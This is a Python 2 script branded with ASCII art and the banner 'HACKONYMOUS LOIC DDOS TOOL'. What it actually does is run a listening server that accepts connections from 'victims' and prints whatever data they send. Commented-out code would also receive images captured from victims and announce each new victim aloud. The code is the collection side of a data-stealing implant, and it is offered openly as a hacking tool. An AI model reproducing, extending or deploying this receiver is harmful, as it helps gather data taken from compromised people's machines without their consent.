from __future__ import print_function
from colorama import *
import socket
from thread import start_new_thread
import time
import os,subprocess
import sys
#subprocess.call(["speech-dispatcher"])

init()
print(Fore.GREEN)
global init_space
global left_eye
global right_eye
init_space = 1
left_eye = 3
right_eye = 51

for i in range(1,5):
   print()
for i in range(1,35):
   print ("               ",end='')
   left_eye += 1
   right_eye -= 1
   for j in range(1,55):
      if i == 1:
	 print("0",end="")
      if i == 1 and j == 54:
         print(end="\n")
      if i is not 1:
         if i <= 20:
            if j == 1:
	       print("0",end="")
            elif j == 54:
               print("0",end="\n")  
            elif((j == left_eye and i > 4) and i < 15):
               print("*",end="")
            elif((j == right_eye and i > 4) and i < 15):
               print("*",end="")
            elif((i > 16) and j == 26):
               print("|",end="")
            else:
	       print(" ",end="")
         else:  
            if(j == init_space+1):
               print("0",end="")
            elif((i < 24) and j == 26):
               print("|",end="")
            elif(j == (54 - init_space)):
               init_space +=1
               print("0",end="\n")
               break
            elif((i == 30) and (j > (init_space + 6) and j < (54 - (init_space + 6)))):
               print("-",end="")
            elif(i == 34 and j > init_space):
               print("1",end="")
            else:
               print(" ",end="")

print(Fore.RED)
for i in range(1,3):
   print()
print ("                             ",end='')
print("HACKONYMOUS LOIC DDOS TOOL")
print(Fore.YELLOW)
print("                             LOADING ",end="")
count = 1
while count < 10:
   sys.stdout.write(" .")
   sys.stdout.flush()
   count += 1
   time.sleep(1)
time.sleep(2)
os.system("clear")

for i in range(1,3):
   print()

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#sock_img = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(("192.168.59.133",10000))
#sock_img.bind(("192.168.59.133",10001))
sock.listen(5)
#sock_img.listen(5)

def victim_handler(v_sock,addr):
   while True:
      data = v_sock.recv(1024)
      if not data:
         v_sock.close()
         print(Fore.WHITE)
         break
      print("Data received by "+str(addr)+" --- "+data)

'''def victim_image_capture(v_sock,addr):
   victim_image = open(str(addr[0])+"_image_port_"+str(addr[1])+".jpg","w")
   while True:
      data = v_sock.recv(1024)
      victim_image.write(data)
      if not data:
         v_sock.close()
         sock_img.close()
         break
   print("Image received")
   print(Fore.WHITE)
   exit(0)'''

while True:
   con,addr = sock.accept()
   '''try:
      img_con,addr_img = sock_img.accept()
   except:
      print("connection lost")
      img_con.close()
      sock_img.close()
      print(Fore.WHITE)
      exit(0)'''
   print(Fore.BLUE)
   if con:
      print("New victim added "+str(addr))
   '''if img_con:
      print("New victim added "+str(addr_img))
   subprocess.call(['spd-say', '"A new victim has been found"'])'''
   print(Fore.YELLOW)
   if con:
      start_new_thread(victim_handler,(con,addr))
   '''if img_con:
      start_new_thread(victim_image_capture,(img_con,addr_img))'''

sock.close()


			   
